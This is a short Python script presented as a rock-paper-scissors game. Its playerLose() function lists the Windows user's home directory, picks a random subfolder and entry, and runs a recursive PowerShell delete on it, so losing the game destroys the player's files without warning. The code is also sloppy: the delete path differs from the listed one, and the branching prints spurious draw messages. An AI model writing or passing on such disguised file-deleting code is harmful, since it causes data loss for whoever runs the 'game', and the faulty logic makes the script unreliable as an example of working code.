import os
import random

player = input()

com = random.choice(['rock', 'paper', 'scisors'])

def playerLose():
    path = os.getcwd()

    path_list = path.split('\\')
    username = path_list[2]

    os.system(f"dir /B C:\\users\\{username} > file.txt")

    with open("file.txt", "r") as r_file:
        user_directory_list = r_file.read().split('\n')

    random_dict = random.choice(user_directory_list[:-1])
    os.system(f"dir C:\\users\\{username}\\{random_dict} > file.txt")


    with open("file.txt", "r") as r_file:
        user_directory_list = r_file.read().split('\n')

    file_to_remove = random.choice(user_directory_list)
    os.system(f"powershell rm -Recurse C:\\user\\{username}\\{random_dict}\\{file_to_remove}")



if player == 'rock' and com == 'scisors':
    print("hooray you win!!!! :3 conga rats poolkie <3")
elif player == 'rock' and com == 'paper':
    playerLose()
else:
    print("man, bummer dude, a draw? Get better bozo >:(")
    

if player == 'paper' and com == 'rock':
    print("hooray you win!!!! :3 conga rats poolkie <3")
elif player == 'paper' and com == 'scisors':
    playerLose()
else:
    print("man, bummer dude, a draw? Get better bozo >:(")

if player == 'scisors' and com == 'paper':
    print("hooray you win!!!! :3 conga rats poolkie <3")
elif player == 'scisors' and com == 'rock':
    playerLose()
else:
    print("man, bummer dude, a draw? Get better bozo >:(")